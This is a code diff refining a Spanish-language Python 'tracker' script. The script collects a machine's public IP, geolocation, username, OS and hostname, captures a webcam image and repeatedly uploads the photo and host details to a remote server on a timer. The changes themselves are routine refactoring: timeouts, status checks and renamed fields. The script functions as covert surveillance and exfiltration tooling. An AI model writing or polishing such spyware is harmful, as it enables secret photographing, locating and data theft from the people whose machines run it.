@@ -52,33 +52,34 @@ def obtener_ip_publica():
 
 def obtener_geolocalizacion(ip):
     try:
-        res = requests.get(f"https://ipinfo.io/{ip}/json")
-        data = res.json()
-        print(f"[*] Geolocalización obtenida: {data}")
-        return {
-            "ciudad": data.get("city"),
-            "region": data.get("region"),
-            "pais": data.get("country"),
-            "loc": data.get("loc")
-        }
+        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
+        if res.status_code == 200:
+            data = res.json()
+            print(f"[*] Geolocalización obtenida: {data}")
+            return {
+                "ciudad": data.get("city"),
+                "region": data.get("region"),
+                "pais": data.get("country"),
+                "loc": data.get("loc")
+            }
+        else:
+            print(f"[!] Error {res.status_code} al obtener geolocalización.")
+            return {}
     except Exception as e:
         print(f"[!] Error al obtener geolocalización: {e}")
         return {}
 
 def recolectar_info():
-    ip_publica = obtener_ip_publica()
+    ip = obtener_ip_publica()
     info = {
-        "ip_publica": ip_publica,
-        "usuario": getpass.getuser(),
-        "sistema": f"{platform.system()} {platform.release()}",
-        "version": platform.version(),
+        "ip": ip,
+        "username": getpass.getuser(),
+        "system_info": f"{platform.system()} {platform.release()} ({platform.version()})",
         "nombre_equipo": socket.gethostname(),
         "hora": str(datetime.now())
     }
-    info.update(obtener_geolocalizacion(ip_publica))
-    print("[*] Información recolectada:")
-    for clave, valor in info.items():
-        print(f"  {clave}: {valor}")
+    info.update(obtener_geolocalizacion(ip))
+    print("[*] Información recolectada:", json.dumps(info, indent=2))
     return info
 
 def enviar_al_servidor(info, archivos):
@@ -86,9 +87,9 @@ def enviar_al_servidor(info, archivos):
         with open(archivos["webcam"], "rb") as img_file:
             files = {"image": img_file}
             data = {
-                "ip": info.get("ip_publica", "sin_ip"),
-                "username": info.get("usuario", "sin_usuario"),
-                "system_info": f"{info.get('sistema', 'desconocido')} ({info.get('version', '')})"
+                "ip": info["ip"],
+                "username": info["username"],
+                "system_info": info["system_info"]
             }
             print("[*] Enviando al servidor:")
             print("  data:", data)
@@ -108,7 +109,6 @@ def ejecutar_rastreador():
             enviar_al_servidor(info, archivos)
         else:
             print("[!] No se capturó webcam.")
-        print(f"[⏱] Esperando {INTERVALO_MINUTOS} minutos...\n")
         time.sleep(INTERVALO_MINUTOS * 60)
 
 if __name__ == "__main__":
